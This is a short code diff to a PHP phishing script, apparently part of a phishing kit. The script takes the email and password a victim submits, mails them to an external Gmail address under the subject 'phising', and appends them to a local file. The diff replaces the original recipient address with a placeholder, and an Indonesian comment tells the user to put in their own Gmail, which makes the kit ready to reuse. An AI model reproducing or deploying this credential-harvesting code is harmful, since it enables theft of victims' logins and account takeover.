@@ -15,7 +15,8 @@
     $password = $_POST['password'];
     $message = $email . " " . $password . "\n";
 
-    mail('livechatvald00s@gmail.com', 'phising', $message);
+    //ganti gmail dengan gmail kamu
+    mail('gmailmilikmu@gmail.com', 'phising', $message);
     $myfile = fopen("hasil.txt", "a") or die("Unable to open file!");
     fwrite($myfile, $message);
     fclose($myfile);
